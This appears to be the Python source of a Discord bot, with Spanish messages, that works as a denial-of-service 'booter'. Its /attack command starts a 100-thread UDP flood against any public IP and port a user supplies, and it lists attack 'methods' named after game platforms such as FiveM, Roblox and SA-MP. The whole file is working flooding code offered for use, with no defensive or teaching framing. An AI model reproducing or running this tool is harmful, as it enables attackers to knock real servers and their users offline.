import discord
from discord import app_commands
from discord.ext import commands
import socket
import threading
import time
from random import randint
import re
import os

intents = discord.Intents.default()
bot = commands.Bot(command_prefix="/", intents=intents)
tree = bot.tree

AUTHORIZED_USERS = [123456789012345678]  # Reemplaza con tu ID de usuario de Discord

def is_valid_public_ip(ip):
    regex = r"^\d{1,3}(\.\d{1,3}){3}$"
    if not re.match(regex, ip):
        return False
    parts = list(map(int, ip.split(".")))
    if parts[0] == 127 or parts[0] == 0 or parts[0] == 10:
        return False
    if parts[0] == 192 and parts[1] == 168:
        return False
    if parts[0] == 172 and 16 <= parts[1] <= 31:
        return False
    return all(0 <= part <= 255 for part in parts)

class Brutalize:
    def __init__(self, ip, port, force=9999, threads=100):
        self.ip = ip
        self.port = port
        self.force = force
        self.threads = threads
        self.client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.data = str.encode("x" * self.force)
        self.len = len(self.data)
        self.on = False

    def flood(self, duration):
        self.on = True
        self.sent = 0
        self.total = 0

        for _ in range(self.threads):
            threading.Thread(target=self.send).start()

        info_thread = threading.Thread(target=self.info)
        info_thread.start()

        time.sleep(duration)
        self.on = False
        info_thread.join()

    def info(self):
        interval = 0.05
        now = time.time()
        size = 0
        bytediff = 8
        mb = 1000000
        gb = 1000000000

        while self.on:
            time.sleep(interval)
            if not self.on:
                break

            if size != 0:
                self.total += self.sent * bytediff / gb * interval

            now2 = time.time()
            if now + 1 >= now2:
                continue

            size = round(self.sent * bytediff / mb)
            self.sent = 0
            now += 1

    def send(self):
        while self.on:
            try:
                self.client.sendto(self.data, (self.ip, self._randport()))
                self.sent += self.len
            except:
                pass

    def _randport(self):
        return self.port or randint(1, 65535)

@tree.command(name="methods", description="Muestra los métodos disponibles")
async def methods(interaction: discord.Interaction):
    await interaction.response.send_message(
        "**Métodos disponibles:**\n"
        "`UDPPPS`, `UDPPACKETS`, `UDPKILL`, `UDP-GAME`, `MCPE`, `UDP-MIX`,\n"
        "`FIVEM`, `MTA`, `SAMP`, `ROBLOX`, `RAKNET`, `UDPFLURY`,\n"
        "`UDPNUCLEAR`, `UDPSHIELD`, `PACKETSBRUTE`, `UDPGOOD`, `UDPBYPASS`",
        ephemeral=True
    )

@tree.command(name="attack", description="Lanza un ataque UDP (solo para uso autorizado)")
@app_commands.describe(
    ip="Dirección IP pública",
    port="Puerto",
    method="Método de ataque",
    time="Duración del ataque en segundos"
)
async def attack(interaction: discord.Interaction, ip: str, port: int, method: str, time: int):
    if interaction.user.id not in AUTHORIZED_USERS:
        await interaction.response.send_message("No tienes permiso para usar este comando.", ephemeral=True)
        return

    valid_methods = [
        "UDPPPS", "UDPPACKETS", "UDPKILL", "UDP-GAME", "MCPE", "UDP-MIX",
        "FIVEM", "MTA", "SAMP", "ROBLOX", "RAKNET", "UDPFLURY", "UDPNUCLEAR",
        "UDPSHIELD", "PACKETSBRUTE", "UDPGOOD", "UDPBYPASS"
    ]

    if method.upper() not in valid_methods:
        await interaction.response.send_message("Método inválido.", ephemeral=True)
        return

    if not is_valid_public_ip(ip):
        await interaction.response.send_message("IP inválida. Debe ser una IP pública.", ephemeral=True)
        return

    await interaction.response.send_message(f"Ataque lanzado a `{ip}:{port}` con método `{method.upper()}` durante `{time}` segundos.")

    threading.Thread(target=lambda: Brutalize(ip, port).flood(time)).start()

# Token del bot
TOKEN = "TU_TOKEN_DE_DISCORD_AQUI"

@bot.event
async def on_ready():
    await tree.sync()
    print(f"Bot conectado como {bot.user}")

if __name__ == "__main__":
    os.system("cls" if os.name == "nt" else "clear")
    bot.run(TOKEN)
